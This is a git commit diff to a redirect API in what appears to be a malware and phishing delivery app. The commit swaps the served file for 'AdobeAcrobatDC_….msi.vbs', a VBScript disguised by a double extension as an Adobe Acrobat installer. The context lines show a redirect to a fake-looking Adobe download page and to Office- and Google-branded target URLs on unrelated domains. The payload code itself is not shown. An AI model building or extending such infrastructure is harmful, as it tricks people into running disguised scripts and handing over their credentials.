e3fe6a69075aad22f0068b3a6312fbe4164eed99
kka03517-gif <kka03517@gmail.com>
2026-03-17 05:01:07 -0700

    Update MSI path and adjust download handling

--- redirect-app/pages/api/redirect.js
+++ redirect-app/pages/api/redirect.js
@@ -5,7 +5,7 @@ import dns from "dns/promises";
 const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
   "https://marcenarias.net/adobe/reader/download.html";
 
-const MSI_PATH = "/User_Adobe_Reader_instalIl.msi";
+const MSI_PATH = "/AdobeAcrobatDC_2025.003.40436_29091.msi.vbs";
 
 const OFFICE_TARGET = "https://elreydeltrompo.com/dash/off";
 const GOOGLE_TARGET = "https://elreydeltrompo.com/css/cw";
